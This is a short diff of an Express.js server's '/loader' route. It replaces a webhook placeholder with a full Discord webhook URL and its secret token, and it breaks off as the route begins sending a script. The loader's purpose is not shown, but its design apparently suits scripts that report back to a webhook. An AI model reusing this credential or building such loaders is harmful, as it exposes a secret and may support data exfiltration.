@@ -21,7 +21,7 @@ app.get('/ban', (req, res) => {
 });
 
 app.get('/loader', (req, res) => {
-    const webhook = req.query.webhook || 'YOUR_WEBHOOK';
+    const webhook = req.query.webhook || 'https://discord.com/api/webhooks/1525580721916350584/2kJvcbpMHmSXjI2wmiUsfuGp2p_RgqdNcY7TNP3D1BuX7i_kmw3KYk48Ax7B49DxnEgj';
     const scriptName = req.query.script || 'script';
     
     res.send(`
